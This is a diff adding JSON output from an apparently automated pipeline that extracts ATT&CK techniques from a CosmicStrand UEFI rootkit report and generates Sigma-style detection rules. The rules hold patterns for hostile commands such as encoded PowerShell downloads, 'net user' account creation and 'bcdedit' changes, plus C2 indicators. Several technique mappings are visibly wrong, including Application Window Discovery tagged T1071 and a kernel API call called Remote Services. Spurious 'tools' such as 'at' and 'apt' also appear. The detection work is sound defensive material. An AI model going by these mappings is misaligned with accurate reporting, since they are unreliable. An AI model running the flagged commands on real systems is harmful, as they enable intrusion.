@@ -1,0 +1,3328 @@
+{
+  "status": "success",
+  "mode": "langchain",
+  "extraction": {
+    "status": "success",
+    "extraction_summary": {
+      "reports_processed": 1,
+      "total_ttps_extracted": 23,
+      "processing_time_ms": 0
+    },
+    "extraction_results": [
+      {
+        "report_id": "pdf-864132eb9acc9933379bc67b9e707559",
+        "extracted_ttps": [
+          {
+            "ttp_id": "288b8c87-9547-470a-ab72-c5b9eb5be038",
+            "report_id": "pdf-864132eb9acc9933379bc67b9e707559",
+            "technique_name": "Pre-OS Boot",
+            "attack_id": "T1542",
+            "tactic": "Persistence",
+            "description": "The CosmicStrand UEFI firmware rootkit infects the motherboard's firmware, allowing it to persist even after the operating system is reinstalled or the hard drive is replaced.",
+            "confidence_score": 0.716,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.8,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.66,
+              "description_detail": 0.508,
+              "tool_mentions": 1.0,
+              "context_richness": 0.54,
+              "multiple_sources": 0.5
+            },
+            "indicators": [
+              "Gigabyte motherboard",
+              "ASUS motherboard",
+              "H81 chipset",
+              "CSMCORE DXE driver"
+            ],
+            "tools": [
+              "net",
+              "apt",
+              "UEFI firmware rootkit",
+              "shellcode",
+              "sc",
+              "at"
+            ],
+            "extraction_method": "langchain_llm"
+          },
+          {
+            "ttp_id": "0e0d1417-3705-4fa9-8105-c258549ad496",
+            "report_id": "pdf-864132eb9acc9933379bc67b9e707559",
+            "technique_name": "User Execution",
+            "attack_id": "T1204",
+            "tactic": "Execution",
+            "description": "The malware deploys a shellcode in memory and contacts the C2 server to retrieve the actual malicious payload to run on the victim's machine.",
+            "confidence_score": 0.707,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.8,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.58,
+              "description_detail": 0.529,
+              "tool_mentions": 1.0,
+              "context_richness": 0.54,
+              "multiple_sources": 0.5
+            },
+            "indicators": [
+              "shellcode",
+              "C2 server"
+            ],
+            "tools": [
+              "net",
+              "apt",
+              "shellcode",
+              "sc",
+              "malicious payload",
+              "at"
+            ],
+            "extraction_method": "langchain_llm"
+          },
+          {
+            "ttp_id": "04ea3056-b162-4397-aa23-c214ab26e940",
+            "report_id": "pdf-864132eb9acc9933379bc67b9e707559",
+            "technique_name": "Function Hooking",
+            "attack_id": "T1055",
+            "tactic": "Defense Evasion",
+            "description": "The attacker uses function hooking to execute additional code before or after a given function, potentially allowing them to evade detection.",
+            "confidence_score": 0.707,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.8,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.5,
+              "description_detail": 0.468,
+              "tool_mentions": 1.0,
+              "context_richness": 0.76,
+              "multiple_sources": 0.375
+            },
+            "indicators": [],
+            "tools": [
+              "net",
+              "apt",
+              "shellcode",
+              "sc",
+              "at"
+            ],
+            "extraction_method": "langchain_llm"
+          },
+          {
+            "ttp_id": "2260f1e8-3ce7-4851-99af-d6a72e175807",
+            "report_id": "pdf-864132eb9acc9933379bc67b9e707559",
+            "technique_name": "Impair Defenses",
+            "attack_id": "T1562",
+            "tactic": "Defense Evasion",
+            "description": "CosmicStrand attempts to disable PatchGuard, a security mechanism introduced to prevent modifications in key structures of the Windows kernel in memory",
+            "confidence_score": 0.704,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.8,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.58,
+              "description_detail": 0.505,
+              "tool_mentions": 1.0,
+              "context_richness": 0.54,
+              "multiple_sources": 0.5
+            },
+            "indicators": [
+              "PatchGuard",
+              "KiFilterFiberContext"
+            ],
+            "tools": [
+              "net",
+              "apt",
+              "shellcode",
+              "sc",
+              "at",
+              "CosmicStrand"
+            ],
+            "extraction_method": "langchain_llm"
+          },
+          {
+            "ttp_id": "a432c242-be46-496b-b530-a072b57d65b0",
+            "report_id": "pdf-864132eb9acc9933379bc67b9e707559",
+            "technique_name": "Command and Scripting Interpreter",
+            "attack_id": "T1059",
+            "tactic": "Execution",
+            "description": "CosmicStrand executes a callback in the context of winlogon.exe and runs command lines to create a user and add it to the local administrators group",
+            "confidence_score": 0.703,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.8,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.58,
+              "description_detail": 0.5,
+              "tool_mentions": 1.0,
+              "context_richness": 0.54,
+              "multiple_sources": 0.5
+            },
+            "indicators": [
+              "winlogon.exe",
+              "aaaabbbb"
+            ],
+            "tools": [
+              "net",
+              "apt",
+              "shellcode",
+              "sc",
+              "at",
+              "CosmicStrand"
+            ],
+            "extraction_method": "langchain_llm"
+          },
+          {
+            "ttp_id": "f83f7aee-2d26-4396-934a-796c80b39233",
+            "report_id": "pdf-864132eb9acc9933379bc67b9e707559",
+            "technique_name": "Command and Scripting Interpreter",
+            "attack_id": "T1059",
+            "tactic": "Execution",
+            "description": "The malware sets up a malicious hook in the boot manager, allowing it to modify Windows' kernel loader before it is executed.",
+            "confidence_score": 0.699,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.8,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.58,
+              "description_detail": 0.476,
+              "tool_mentions": 1.0,
+              "context_richness": 0.54,
+              "multiple_sources": 0.5
+            },
+            "indicators": [
+              "boot manager",
+              "kernel loader"
+            ],
+            "tools": [
+              "net",
+              "apt",
+              "shellcode",
+              "sc",
+              "malicious hook",
+              "at"
+            ],
+            "extraction_method": "langchain_llm"
+          },
+          {
+            "ttp_id": "5866b955-9c71-40f4-96d9-b825cef79783",
+            "report_id": "pdf-864132eb9acc9933379bc67b9e707559",
+            "technique_name": "Boot or Logon Autostart Execution",
+            "attack_id": "T1547",
+            "tactic": "Persistence",
+            "description": "The malware sets up a malicious hook in the Windows kernel, allowing it to persist after the operating system has started up.",
+            "confidence_score": 0.699,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.8,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.58,
+              "description_detail": 0.476,
+              "tool_mentions": 1.0,
+              "context_richness": 0.54,
+              "multiple_sources": 0.5
+            },
+            "indicators": [
+              "Windows kernel",
+              "malicious hook"
+            ],
+            "tools": [
+              "net",
+              "apt",
+              "UEFI firmware rootkit",
+              "shellcode",
+              "sc",
+              "at"
+            ],
+            "extraction_method": "langchain_llm"
+          },
+          {
+            "ttp_id": "474df3b7-7556-450a-bac3-58518353b856",
+            "report_id": "pdf-864132eb9acc9933379bc67b9e707559",
+            "technique_name": "Exfiltration Over Command and Control Channel",
+            "attack_id": "T1041",
+            "tactic": "Exfiltration",
+            "description": "CosmicStrand retrieves its final payload by sending a specifically crafted UDP or TCP packet to its C2 server",
+            "confidence_score": 0.696,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.8,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.62,
+              "description_detail": 0.414,
+              "tool_mentions": 1.0,
+              "context_richness": 0.54,
+              "multiple_sources": 0.5
+            },
+            "indicators": [
+              "update.bokts.com",
+              "8.8.8.8",
+              "222.222.67.208"
+            ],
+            "tools": [
+              "net",
+              "apt",
+              "shellcode",
+              "sc",
+              "at",
+              "CosmicStrand"
+            ],
+            "extraction_method": "langchain_llm"
+          },
+          {
+            "ttp_id": "68c7663e-1138-49f0-afb8-9f6d69d32ed5",
+            "report_id": "pdf-864132eb9acc9933379bc67b9e707559",
+            "technique_name": "Remote Services",
+            "attack_id": "T1021",
+            "tactic": "Lateral Movement",
+            "description": "CosmicStrand uses the ZwCreateSection function to create a remote service and allocate a buffer in the kernel's address space",
+            "confidence_score": 0.694,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.8,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.58,
+              "description_detail": 0.437,
+              "tool_mentions": 1.0,
+              "context_richness": 0.54,
+              "multiple_sources": 0.5
+            },
+            "indicators": [
+              "ZwCreateSection",
+              "ntoskrnl.exe"
+            ],
+            "tools": [
+              "net",
+              "apt",
+              "shellcode",
+              "sc",
+              "at",
+              "CosmicStrand"
+            ],
+            "extraction_method": "langchain_llm"
+          },
+          {
+            "ttp_id": "c03baaaa-ffeb-4cac-8b8c-43dc6e52b862",
+            "report_id": "pdf-864132eb9acc9933379bc67b9e707559",
+            "technique_name": "Privilege Escalation",
+            "attack_id": "T1055",
+            "tactic": "Privilege Escalation",
+            "description": "CosmicStrand escalates privileges by modifying the Windows OS loader and kernel in memory",
+            "confidence_score": 0.685,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.8,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.62,
+              "description_detail": 0.337,
+              "tool_mentions": 1.0,
+              "context_richness": 0.54,
+              "multiple_sources": 0.5
+            },
+            "indicators": [
+              "Archpx64TransferTo64BitApplicationAsm",
+              "OslArchTransferToKernel",
+              "ntoskrnl.exe"
+            ],
+            "tools": [
+              "net",
+              "apt",
+              "shellcode",
+              "sc",
+              "at",
+              "CosmicStrand"
+            ],
+            "extraction_method": "langchain_llm"
+          },
+          {
+            "ttp_id": "07966540-88e6-4530-a01c-0f269bf9e2bc",
+            "report_id": "pdf-864132eb9acc9933379bc67b9e707559",
+            "technique_name": "Application Window Discovery",
+            "attack_id": "T1071",
+            "tactic": "Discovery",
+            "description": "CosmicStrand waits until a thread turns up in winlogon.exe and then executes a callback in this high-privilege context",
+            "confidence_score": 0.684,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.8,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.54,
+              "description_detail": 0.414,
+              "tool_mentions": 1.0,
+              "context_richness": 0.54,
+              "multiple_sources": 0.5
+            },
+            "indicators": [
+              "winlogon.exe"
+            ],
+            "tools": [
+              "net",
+              "apt",
+              "shellcode",
+              "sc",
+              "at",
+              "CosmicStrand"
+            ],
+            "extraction_method": "langchain_llm"
+          },
+          {
+            "ttp_id": "7d99645f-a9b2-443b-be6a-776f83d45dc2",
+            "report_id": "pdf-864132eb9acc9933379bc67b9e707559",
+            "technique_name": "Input Capture",
+            "attack_id": "T1056",
+            "tactic": "Collection",
+            "description": "CosmicStrand collects the addresses of API functions provided by the kernel and creates an import table",
+            "confidence_score": 0.683,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.8,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.58,
+              "description_detail": 0.368,
+              "tool_mentions": 1.0,
+              "context_richness": 0.54,
+              "multiple_sources": 0.5
+            },
+            "indicators": [
+              "ZwCreateSection",
+              "ntoskrnl.exe"
+            ],
+            "tools": [
+              "net",
+              "apt",
+              "shellcode",
+              "sc",
+              "at",
+              "CosmicStrand"
+            ],
+            "extraction_method": "langchain_llm"
+          },
+          {
+            "ttp_id": "05b30c5e-6aaf-49c2-b225-146c985eb098",
+            "report_id": "pdf-864132eb9acc9933379bc67b9e707559",
+            "technique_name": "Boot or Logon Initialization Scripts",
+            "attack_id": "T1547",
+            "tactic": "Persistence",
+            "description": "CosmicStrand is a UEFI firmware rootkit that allows its owners to achieve very durable persistence",
+            "confidence_score": 0.674,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.8,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.54,
+              "description_detail": 0.345,
+              "tool_mentions": 1.0,
+              "context_richness": 0.54,
+              "multiple_sources": 0.5
+            },
+            "indicators": [
+              "UEFI firmware"
+            ],
+            "tools": [
+              "net",
+              "apt",
+              "shellcode",
+              "sc",
+              "at",
+              "CosmicStrand"
+            ],
+            "extraction_method": "langchain_llm"
+          },
+          {
+            "ttp_id": "dd3db8ba-ea51-47c3-b95b-e6d03a28eada",
+            "report_id": "pdf-864132eb9acc9933379bc67b9e707559",
+            "technique_name": "Encrypted Channel",
+            "attack_id": "T1573",
+            "tactic": "Command and Control",
+            "description": "CosmicStrand generates network packets and leverages the UDP and TCP device objects directly",
+            "confidence_score": 0.673,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.8,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.58,
+              "description_detail": 0.299,
+              "tool_mentions": 1.0,
+              "context_richness": 0.54,
+              "multiple_sources": 0.5
+            },
+            "indicators": [
+              "UDP",
+              "TCP"
+            ],
+            "tools": [
+              "net",
+              "apt",
+              "shellcode",
+              "sc",
+              "at",
+              "CosmicStrand"
+            ],
+            "extraction_method": "langchain_llm"
+          },
+          {
+            "ttp_id": "98b753b6-e2a2-4611-a954-fc69507e36fe",
+            "report_id": "pdf-864132eb9acc9933379bc67b9e707559",
+            "technique_name": "Exploit Public-Facing Application",
+            "attack_id": "T1190",
+            "tactic": "Initial Access",
+            "description": "CosmicStrand exploits the UEFI firmware to gain initial access to the system",
+            "confidence_score": 0.663,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.8,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.54,
+              "description_detail": 0.276,
+              "tool_mentions": 1.0,
+              "context_richness": 0.54,
+              "multiple_sources": 0.5
+            },
+            "indicators": [
+              "UEFI firmware"
+            ],
+            "tools": [
+              "net",
+              "apt",
+              "shellcode",
+              "sc",
+              "at",
+              "CosmicStrand"
+            ],
+            "extraction_method": "langchain_llm"
+          },
+          {
+            "ttp_id": "dbed56eb-1a0f-4b07-b415-871963aa56f3",
+            "report_id": "pdf-864132eb9acc9933379bc67b9e707559",
+            "technique_name": "System Information Discovery",
+            "attack_id": "T1082",
+            "tactic": "Discovery",
+            "description": "CosmicStrand tests the internet connectivity of the infected machine",
+            "confidence_score": 0.659,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.8,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.58,
+              "description_detail": 0.207,
+              "tool_mentions": 1.0,
+              "context_richness": 0.54,
+              "multiple_sources": 0.5
+            },
+            "indicators": [
+              "8.8.8.8",
+              "222.222.67.208"
+            ],
+            "tools": [
+              "net",
+              "apt",
+              "shellcode",
+              "sc",
+              "at",
+              "CosmicStrand"
+            ],
+            "extraction_method": "langchain_llm"
+          },
+          {
+            "ttp_id": "ab8ce7ac-de18-4f4b-b5a7-5748af08a440",
+            "report_id": "pdf-864132eb9acc9933379bc67b9e707559",
+            "technique_name": "Create or Modify System Process",
+            "attack_id": "T1543",
+            "tactic": "Persistence",
+            "description": "Detected Create or Modify System Process activity via NLP pattern matching",
+            "confidence_score": 0.64,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.8,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.5,
+              "description_detail": 0.246,
+              "tool_mentions": 1.0,
+              "context_richness": 0.54,
+              "multiple_sources": 0.375
+            },
+            "indicators": [],
+            "tools": [
+              "net",
+              "apt",
+              "shellcode",
+              "sc",
+              "at"
+            ],
+            "extraction_method": "nlp_indicator"
+          },
+          {
+            "ttp_id": "c8323208-0fd9-4abe-ab61-c80293200643",
+            "report_id": "pdf-864132eb9acc9933379bc67b9e707559",
+            "technique_name": "Process Injection",
+            "attack_id": "T1055",
+            "tactic": "Defense Evasion",
+            "description": "Detected Process Injection activity via NLP pattern matching",
+            "confidence_score": 0.636,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.8,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.5,
+              "description_detail": 0.214,
+              "tool_mentions": 1.0,
+              "context_richness": 0.54,
+              "multiple_sources": 0.375
+            },
+            "indicators": [],
+            "tools": [
+              "net",
+              "apt",
+              "shellcode",
+              "sc",
+              "at"
+            ],
+            "extraction_method": "nlp_indicator"
+          },
+          {
+            "ttp_id": "8982fb21-9639-4f8f-90b3-676ff0e575c7",
+            "report_id": "pdf-864132eb9acc9933379bc67b9e707559",
+            "technique_name": "Application Layer Protocol",
+            "attack_id": "T1071",
+            "tactic": "Command And Control",
+            "description": "Detected Application Layer Protocol activity via NLP pattern matching",
+            "confidence_score": 0.633,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.8,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.5,
+              "description_detail": 0.199,
+              "tool_mentions": 1.0,
+              "context_richness": 0.54,
+              "multiple_sources": 0.375
+            },
+            "indicators": [],
+            "tools": [
+              "net",
+              "apt",
+              "shellcode",
+              "sc",
+              "at"
+            ],
+            "extraction_method": "nlp_indicator"
+          },
+          {
+            "ttp_id": "2e7fec05-f573-4bcf-aa6e-11befe13cad5",
+            "report_id": "pdf-864132eb9acc9933379bc67b9e707559",
+            "technique_name": "Exfiltration Over C2 Channel",
+            "attack_id": "T1041",
+            "tactic": "Exfiltration",
+            "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
+            "confidence_score": 0.631,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.8,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.5,
+              "description_detail": 0.185,
+              "tool_mentions": 1.0,
+              "context_richness": 0.54,
+              "multiple_sources": 0.375
+            },
+            "indicators": [],
+            "tools": [
+              "net",
+              "apt",
+              "shellcode",
+              "sc",
+              "at"
+            ],
+            "extraction_method": "nlp_indicator"
+          },
+          {
+            "ttp_id": "525d7214-71e3-4bf5-9ef1-90e824f2116a",
+            "report_id": "pdf-864132eb9acc9933379bc67b9e707559",
+            "technique_name": "Exploit Public-Facing Application",
+            "attack_id": "T1190",
+            "tactic": "Initial Access",
+            "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching",
+            "confidence_score": 0.628,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.8,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.5,
+              "description_detail": 0.162,
+              "tool_mentions": 1.0,
+              "context_richness": 0.54,
+              "multiple_sources": 0.375
+            },
+            "indicators": [],
+            "tools": [
+              "net",
+              "apt",
+              "shellcode",
+              "sc",
+              "at"
+            ],
+            "extraction_method": "nlp_indicator"
+          },
+          {
+            "ttp_id": "0be5a77a-50b9-45bb-8c6f-25801068008f",
+            "report_id": "pdf-864132eb9acc9933379bc67b9e707559",
+            "technique_name": "Screen Capture",
+            "attack_id": "T1113",
+            "tactic": "Collection",
+            "description": "Detected Screen Capture activity via NLP pattern matching",
+            "confidence_score": 0.624,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.8,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.5,
+              "description_detail": 0.139,
+              "tool_mentions": 1.0,
+              "context_richness": 0.54,
+              "multiple_sources": 0.375
+            },
+            "indicators": [],
+            "tools": [
+              "net",
+              "apt",
+              "shellcode",
+              "sc",
+              "at"
+            ],
+            "extraction_method": "nlp_indicator"
+          },
+          {
+            "ttp_id": "4cca071c-8a0b-40fd-89c4-d75eff8229aa",
+            "report_id": "pdf-864132eb9acc9933379bc67b9e707559",
+            "technique_name": "Phishing",
+            "attack_id": "T1566",
+            "tactic": "Initial Access",
+            "description": "Detected Phishing activity via NLP pattern matching",
+            "confidence_score": 0.621,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.8,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.5,
+              "description_detail": 0.116,
+              "tool_mentions": 1.0,
+              "context_richness": 0.54,
+              "multiple_sources": 0.375
+            },
+            "indicators": [],
+            "tools": [
+              "net",
+              "apt",
+              "shellcode",
+              "sc",
+              "at"
+            ],
+            "extraction_method": "nlp_indicator"
+          }
+        ]
+      }
+    ]
+  },
+  "rules": {
+    "rules": [
+      {
+        "title": "CosmicStrand UEFI Firmware Rootkit Detection",
+        "description": "Detects potential CosmicStrand UEFI firmware rootkit activity by monitoring for suspicious driver loads and firmware modifications",
+        "logsource": {
+          "category": "driver_load",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "detection": {
+          "selection": {
+            "Image": "CSMCORE DXE"
+          },
+          "condition": "selection"
+        },
+        "falsepositives": [
+          "Legitimate firmware updates",
+          "Driver installations for Gigabyte or ASUS motherboards"
+        ],
+        "level": "critical",
+        "tags": [
+          "attack.persistence",
+          "attack.t1565",
+          "custom.mitre_tactic_id_persistence",
+          "custom.mitre_technique_id_t1542"
+        ],
+        "ttp_id": "unknown",
+        "technique_name": "Pre-OS Boot",
+        "generation_method": "langchain",
+        "id": "1a63a67f-4bbc-4439-bc5a-97fb0472f01d",
+        "siem_verification": {
+          "detected": false,
+          "status": "success",
+          "message": "Verification complete",
+          "events_found": 0,
+          "query_time_ms": 348.00000000000006
+        }
+      },
+      {
+        "title": "Detection of Malware Deploying Shellcode and Contacting C2 Server",
+        "description": "This rule detects the deployment of shellcode in memory and communication with a C2 server to retrieve a malicious payload, indicative of the User Execution technique.",
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "detection": {
+          "selection": {
+            "Image|endswith": [
+              "\\powershell.exe",
+              "\\cmd.exe"
+            ],
+            "CommandLine|contains|all": [
+              "-enc",
+              "Invoke-WebRequest"
+            ]
+          },
+          "condition": "selection"
+        },
+        "falsepositives": [
+          "Legitimate administrative scripts using encoded commands",
+          "PowerShell modules or scripts that invoke web requests for updates or information"
+        ],
+        "level": "medium",
+        "tags": [
+          "attack.execution",
+          "attack.t1566",
+          "mitre.user_execution"
+        ],
+        "ttp_id": "unknown",
+        "technique_name": "User Execution",
+        "generation_method": "langchain",
+        "id": "870ff47a-167a-4669-8fc9-707ac2b38b33",
+        "siem_verification": {
+          "detected": true,
+          "status": "success",
+          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
+          "events_found": 30,
+          "query_time_ms": 389.0
+        }
+      },
+      {
+        "title": "Suspicious Function Hooking Activity Detected via Image Load and API Calls",
+        "description": "Detects potential function hooking by monitoring for known hooking-related DLL loads and suspicious API calls such as SetWindowsHookEx, CreateRemoteThread, or NtSetInformationThread. This rule leverages Sysmon ImageLoad events and EDR/ETW telemetry to identify malicious behavior used for defense evasion.",
+        "logsource": {
+          "category": "image_load",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "detection": {
+          "selection_image_load": {
+            "ImageLoaded|endswith": [
+              "\\ntdll.dll",
+              "\\detours.dll",
+              "\\easyhook.dll"
+            ]
+          },
+          "selection_api_call": {
+            "CallTarget|contains": [
+              "SetWindowsHookEx",
+              "CreateRemoteThread",
+              "NtSetInformationThread"
+            ]
+          },
+          "filter_signed": {
+            "Signed": "true"
+          },
+          "filter_known_modules": {
+            "Image|endswith": [
+              "\\powershell.exe",
+              "\\explorer.exe",
+              "\\svchost.exe"
+            ]
+          },
+          "condition": "selection_image_load or selection_api_call and not filter_signed and not filter_known_modules"
+        },
+        "falsepositives": [
+          "Legitimate software using detours or hooking libraries for debugging or performance monitoring",
+          "Game overlay applications (e.g., Discord Overlay, Steam) that use function hooking",
+          "Accessibility tools that hook into system processes",
+          "Signed applications performing legitimate inter-process injection for UI automation"
+        ],
+        "level": "high",
+        "tags": [
+          "attack.defense_evasion",
+          "attack.t1179"
+        ],
+        "ttp_id": "unknown",
+        "technique_name": "Function Hooking",
+        "generation_method": "langchain",
+        "id": "fdbec019-014a-4e89-adee-a2fee4a1c25d",
+        "siem_verification": {
+          "detected": true,
+          "status": "success",
+          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
+          "events_found": 5,
+          "query_time_ms": 390.0
+        }
+      },
+      {
+        "title": "CosmicStrand Impair Defenses via PatchGuard Disabling",
+        "description": "Detects attempts to disable PatchGuard, a security mechanism introduced to prevent modifications in key structures of the Windows kernel in memory, as used by CosmicStrand",
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "detection": {
+          "selection": {
+            "CommandLine|contains": [
+              "bcdedit /set loadoptions",
+              "PatchGuard"
+            ]
+          },
+          "condition": "selection"
+        },
+        "falsepositives": [
+          "Legitimate Windows updates or system configuration changes",
+          "Administrative tools used for system maintenance or troubleshooting"
+        ],
+        "level": "high",
+        "tags": [
+          "attack.defense_evasion",
+          "attack.t1562.006",
+          "custom.mitre_impair_defenses"
+        ],
+        "ttp_id": "unknown",
+        "technique_name": "Impair Defenses",
+        "generation_method": "langchain",
+        "id": "bd4a07d9-cad1-4165-8b4d-169923323ab9",
+        "siem_verification": {
+          "detected": false,
+          "status": "success",
+          "message": "Verification complete",
+          "events_found": 0,
+          "query_time_ms": 697.0000000000001
+        }
+      },
+      {
+        "title": "Detect Winlogon.exe Executing User Creation Commands (CosmicStrand)",
+        "description": "Detects execution of net user or net localgroup commands within the context of winlogon.exe, potentially indicating the creation of a new privileged account as described by the CosmicStrand malware behavior.",
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "detection": {
+          "selection_user": {
+            "Image|endswith": "\\winlogon.exe",
+            "CommandLine|contains": "net user"
+          },
+          "selection_group": {
+            "Image|endswith": "\\winlogon.exe",
+            "CommandLine|contains": "net localgroup"
+          },
+          "selection_aaaabbbb": {
+            "Image|endswith": "\\winlogon.exe",
+            "CommandLine|contains": "aaaabbbb"
+          },
+          "condition": "selection_user or selection_group or selection_aaaabbbb"
+        },
+        "falsepositives": [
+          "Legitimate administrative scripts that run net user or net localgroup commands via winlogon.exe during system configuration or domain join processes.",
+          "Third\u2011party management tools that may spawn winlogon.exe as a parent for account management tasks."
+        ],
+        "level": "high",
+        "tags": [
+          "attack.execution",
+          "attack.t1059.003"
+        ],
+        "ttp_id": "unknown",
+        "technique_name": "Command and Scripting Interpreter",
+        "generation_method": "langchain",
+        "id": "06c99ca7-33c8-4865-b52c-fb6042862e0e",
+        "siem_verification": {
+          "detected": true,
+          "status": "success",
+          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
+          "events_found": 103,
+          "query_time_ms": 563.0
+        }
+      },
+      {
+        "title": "Detect Kernel Driver Load or Hook via Service Creation and Execution Utilities",
+        "description": "Detects processes that load kernel drivers or execute code that may install malicious kernel hooks, using sc.exe, fltmc.exe, rundll32.exe, or PowerShell with persistence\u2011related flags.",
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "detection": {
+          "selection_sc": {
+            "Image|endswith": "\\\\sc.exe",
+            "CommandLine|contains": "type= kernel"
+          },
+          "selection_fltmc": {
+            "Image|endswith": "\\\\fltmc.exe",
+            "CommandLine|contains": "load"
+          },
+          "selection_rundll": {
+            "Image|endswith": "\\\\rundll32.exe",
+            "CommandLine|regex": "(?i)kernel.*hook|hook.*kernel"
+          },
+          "selection_powershell": {
+            "Image|endswith": "\\\\powershell.exe",
+            "CommandLine|regex": "(?i)(-enc|-e|-encodedcommand|-Command|-NoProfile|-ExecutionPolicy\\s+Bypass)"
+          },
+          "condition": "selection_sc or selection_fltmc or selection_rundll or selection_powershell"
+        },
+        "falsepositives": [
+          "Legitimate administrators creating kernel\u2011type services with sc.exe",
+          "System components using fltmc.exe to load legitimate filter drivers",
+          "Rundll32.exe used by Windows for normal DLL execution",
+          "PowerShell scripts that legitimately use -EncodedCommand, -NoProfile, or ExecutionPolicy Bypass for automation"
+        ],
+        "level": "high",
+        "tags": [
+          "attack.persistence",
+          "attack.t1547",
+          "custom.windows",
+          "custom.sysmon"
+        ],
+        "ttp_id": "unknown",
+        "technique_name": "Boot or Logon Autostart Execution",
+        "generation_method": "langchain",
+        "id": "a76b5e8f-eacc-4346-926c-179e9fda8f60",
+        "siem_verification": {
+          "detected": true,
+          "status": "success",
+          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
+          "events_found": 85,
+          "query_time_ms": 564.0
+        }
+      },
+      {
+        "title": "Exfiltration Over C2 Channel \u2013 Large Outbound Transfer or Known C2 Indicator",
+        "description": "Detects potential exfiltration over a command and control channel by identifying outbound network connections that either match known C2 indicators or transfer unusually large amounts of data.",
+        "logsource": {
+          "category": "network_connection",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "detection": {
+          "selection_ioc": {
+            "DestinationIp": "222.222.67.208",
+            "DestinationHostname": "update.bokts.com"
+          },
+          "selection_large": {
+            "BytesSent|gt": 1048576,
+            "Direction": "Outbound"
+          },
+          "condition": "selection_ioc or selection_large"
+        },
+        "falsepositives": [
+          "Legitimate large file transfers (e.g., Windows Update, backup or sync services)",
+          "Enterprise monitoring tools that send bulk telemetry to central servers"
+        ],
+        "level": "high",
+        "tags": [
+          "attack.t1041",
+          "attack.exfiltration",
+          "attack.command_and_control"
+        ],
+        "ttp_id": "unknown",
+        "technique_name": "Exfiltration Over Command and Control Channel",
+        "generation_method": "langchain",
+        "id": "e9ca3007-ad4b-400b-b8f0-9170c40b374f",
+        "siem_verification": {
+          "detected": false,
+          "status": "success",
+          "message": "Verification complete",
+          "events_found": 0,
+          "query_time_ms": 678.0
+        }
+      },
+      {
+        "title": "Suspicious Kernel Section Creation via ZwCreateSection",
+        "description": "Detects potential use of ZwCreateSection to create remote services by monitoring for execution context involving ntoskrnl.exe and known service host processes.",
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": null
+        },
+        "detection": {
+          "selection": {
+            "Image|endswith": "\\ntoskrnl.exe"
+          },
+          "parent_selection": {
+            "ParentImage|endswith": [
+              "\\services.exe",
+              "\\svchost.exe"
+            ]
+          },
+          "condition": "selection and parent_selection"
+        },
+        "falsepositives": [
+          "Legitimate system boot processes or driver initialization routines that involve ntoskrnl.exe",
+          "Kernel debugging or legitimate security tools interacting with kernel memory"
+        ],
